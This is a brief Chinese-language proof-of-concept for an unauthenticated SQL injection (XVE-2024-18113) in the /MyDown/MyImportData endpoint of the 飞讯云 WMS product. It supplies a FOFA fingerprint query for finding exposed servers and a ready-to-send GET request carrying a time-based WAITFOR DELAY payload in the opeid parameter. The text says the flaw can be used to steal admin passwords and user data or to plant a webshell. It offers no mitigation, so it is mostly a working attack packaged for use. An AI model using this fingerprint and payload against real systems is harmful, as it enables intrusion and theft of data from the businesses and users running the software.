# 飞讯云MyImportData前台SQL注入(XVE-2024-18113)

飞讯云-WMS /MyDown/MyImportData 接口处存在前台SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```yaml
FOFA：body="wx8ccb75857bd3e985"
```

## poc

```yaml
GET /MyDown/MyImportData?opeid=1%27+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252259581.png)
